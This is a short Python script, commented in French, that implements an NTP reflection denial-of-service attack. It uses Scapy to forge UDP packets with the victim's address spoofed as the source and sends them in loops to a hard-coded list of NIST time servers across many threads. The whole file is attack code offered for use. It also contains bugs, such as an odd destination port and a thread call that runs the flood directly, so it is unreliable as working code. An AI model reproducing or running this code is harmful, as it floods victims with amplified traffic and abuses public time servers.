"""
ntp Layer 4 attack 
@azseza
used by the main program
"""
from scapy.all import  Raw, send
from scapy.layers.inet import IP, UDP
import sys
import threading
import time
import random
"""
Ce programme execute une NTP DoS attack
IL FAUT QUE LE NOMBRE DE THREAD SOIT SUPERIEUR AU NOMBRE DE SERVEURS
Principe : 
    Principalment on va emmerger la cible par des paquets UDP en utilisant les serveurs ntp
    et leurs protocle respectifs en recréant les paquets qu'ils transmettent d'habitude.
"""
#Definition de certaines variables 
global ntplist
global currentserver
global data
global target

data = "\x17\x00\x03\x2a" + "\x00" * 4

ntplist = ['time-a-g.nist.gov', 'time-b-g.nist.gov', 'time-c-g.nist.gov',
                'time-d-g.nist.gov', 'time-d-g.nist.gov', 'time-e-g.nist.gov',
                'time-e-g.nist.gov', 'time-a-b.nist.gov', 'time-b-b.nist.gov',
                'time-c-b.nist.gov', 'time-d-b.nist.gov', 'time-d-b.nist.gov']
 
currentserver = 0 #fixing UnboundlocalError
def dosEm(target, ntplist, data, currentserver):
        """
        Fonction qui construit un paquet et qui l'envoie
        """
        ntpserver = ntplist[currentserver] #LOAD THE SERVER
        packet = IP(dst=ntpserver,src=target)/UDP(sport=48947,dport=1203)/Raw(load=data) #CONSTRUIRE LE PAQUER
        send(packet,loop=1) #ENVOYER 

def floodNTP(numberthreads, targget):
        #initialisation
        threads = []
        global currentserver
        print("Starting to flood: "+ str(targget) + " using NTP list: " 
                + str(ntplist) + " With " + str(numberthreads) + " threads")
        print("Use CTRL+C to stop attack")
        
        #Automatisation de l'attaque 
        for n in range(numberthreads):
            thread = threading.Thread(target=dosEm(targget, ntplist, data, currentserver))
            thread.daemon = True
            thread.start()
        
            threads.append(thread)
        
            print(f"Sending for the {0}...",n)
            currentserver = currentserver + 1 #InCRÉMENTER

        #Boucle pour que le Ctrl+c met fin au script
        while True:
            time.sleep(1)
